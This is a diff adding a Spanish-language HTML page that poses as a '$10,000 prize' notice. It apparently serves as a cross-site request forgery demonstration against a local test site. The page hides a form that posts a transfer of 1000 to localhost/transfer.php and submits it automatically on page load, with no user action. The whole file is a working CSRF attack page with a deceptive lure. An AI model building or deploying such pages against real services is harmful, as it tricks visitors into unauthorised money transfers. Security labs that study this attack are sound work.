@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>¡Felicidades! Has ganado un premio</title>
+</head>
+<body>
+    <h1>🎉 ¡Has ganado $10,000!</h1>
+    <p>Haz clic en el botón para reclamar tu premio...</p>
+    
+    <!-- Formulario oculto que envía transferencia -->
+    <form id="maliciousForm" method="post" action="http://localhost/transfer.php">
+        <input hidden type="number" name="amount" value="1000">
+    </form>
+
+    <script>
+        // Se ejecuta automáticamente al cargar la página
+        document.getElementById('maliciousForm').submit();
+    </script>
+</body>
+</html>
